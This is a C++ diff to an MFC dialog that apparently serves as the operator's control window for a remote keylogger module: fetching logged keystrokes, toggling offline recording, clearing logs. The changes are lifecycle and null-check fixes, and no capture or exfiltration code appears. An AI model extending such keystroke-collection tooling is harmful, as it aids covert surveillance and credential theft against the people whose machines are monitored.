@@ -13,10 +13,11 @@ IMPLEMENT_DYNAMIC(CKeybdLogDlg, CDialogEx)
 
 CKeybdLogDlg::CKeybdLogDlg(CKeybdLogSrv*pHandler, CWnd* pParent /*=NULL*/)
 	: CDialogEx(CKeybdLogDlg::IDD, pParent)
-	, m_Interval(3)
+	, m_Interval(3),
+	m_DestroyAfterDisconnect(FALSE),
+	m_pHandler(pHandler),
+	m_dwTimerId(0)
 {
-	m_pHandler = pHandler;
-	m_dwTimerId = 0;
 }
 
 CKeybdLogDlg::~CKeybdLogDlg()
@@ -48,12 +49,27 @@ END_MESSAGE_MAP()
 
 // CKeybdLogDlg 消息处理程序
 
+void CKeybdLogDlg::PostNcDestroy()
+{
+	// TODO:  在此添加专用代码和/或调用基类
+
+	CDialogEx::PostNcDestroy();
+	if (!m_DestroyAfterDisconnect){
+		delete this;
+	}
+}
+
 
 void CKeybdLogDlg::OnClose()
 {
+	// TODO:  在此添加消息处理程序代码和/或调用默认值
 	if (m_pHandler){
+		m_DestroyAfterDisconnect = TRUE;
 		m_pHandler->Close();
-		m_pHandler = NULL;
+	}
+	else{
+		//m_pHandler已经没了,现在只管自己就行.
+		DestroyWindow();
 	}
 }
 
@@ -122,7 +138,8 @@ void CKeybdLogDlg::OnBnClickedOk2()
 //获取记录
 void CKeybdLogDlg::OnBnClickedOk()
 {
-	m_pHandler->GetLogData();
+	if (m_pHandler)
+		m_pHandler->GetLogData();
 }
 
 
@@ -160,7 +177,7 @@ void CKeybdLogDlg::OnTimer(UINT_PTR nIDEvent)
 LRESULT	CKeybdLogDlg::OnError(WPARAM wParam, LPARAM lParam)
 {
 	TCHAR*szError = (TCHAR*)wParam;
-	MessageBox(szError, TEXT("Error"));
+	MessageBox(szError, TEXT("Error"),MB_OK | MB_ICONINFORMATION);
 	return 0;
 }
 
@@ -174,7 +191,8 @@ LRESULT CKeybdLogDlg::OnLogInit(WPARAM wParam, LPARAM lParam)
 	GetDlgItem(IDOK2)->EnableWindow();
 	GetDlgItem(IDOK)->EnableWindow();
 
-	m_pHandler->GetLogData();
+	if (m_pHandler)
+		m_pHandler->GetLogData();
 	//开始定时获取数据.
 	m_dwTimerId = SetTimer(0x10086, m_Interval * 1000, NULL);
 	return 0;
@@ -183,7 +201,8 @@ LRESULT CKeybdLogDlg::OnLogInit(WPARAM wParam, LPARAM lParam)
 void CKeybdLogDlg::OnBnClickedCheck1()
 {
 	//
-	m_pHandler->SetOfflineRecord(m_OfflineRecord.GetCheck());
+	if (m_pHandler)
+		m_pHandler->SetOfflineRecord(m_OfflineRecord.GetCheck());
 }
 
 
@@ -191,5 +210,13 @@ void CKeybdLogDlg::OnBnClickedCheck1()
 void CKeybdLogDlg::OnBnClickedButton1()
 {
 	m_Log.SetWindowTextW(TEXT(""));
-	m_pHandler->CleanLog();
+	if (m_pHandler)
+		m_pHandler->CleanLog();
+}
+
+
+
+
+void CKeybdLogDlg::OnOK()
+{
 }
